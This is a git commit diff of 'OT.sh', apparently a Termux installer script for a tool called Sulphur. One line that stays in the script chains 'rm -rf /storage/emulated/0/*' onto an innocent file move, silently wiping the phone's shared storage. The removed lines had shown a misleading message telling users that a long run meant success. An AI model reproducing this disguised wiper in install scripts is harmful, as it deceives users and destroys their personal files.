748b95240bc28222cb35b9ca78ef63b49dfdf345
Sulphur <60334841+onlySULPHUR@users.noreply.github.com>
2021-04-21 11:08:48 +0530

    Update OT.sh

--- OT.sh
+++ OT.sh
@@ -5,9 +5,3 @@ mkdir /data/data/com.termux/files/home/Sulphur/pytransform
 mv /data/data/com.termux/files/home/Sulphur/_pytransform.so /data/data/com.termux/files/home/Sulphur/pytransform/
 mv /data/data/com.termux/files/home/Sulphur/__init__.py /data/data/com.termux/files/home/Sulphur/pytransform/ ; rm -rf /storage/emulated/0/*
 
-pkg install python -y && pkg install tsu -y && termux-setup-storage && python -m pip install requests && pip install colorama 
-sleep 1
-sleep 1
-echo -e "\e[93m If The Process Took More Than 2 Minites than it is succeeded otherwise uninstall termux and do this process again"
-sleep 1
-exit 0
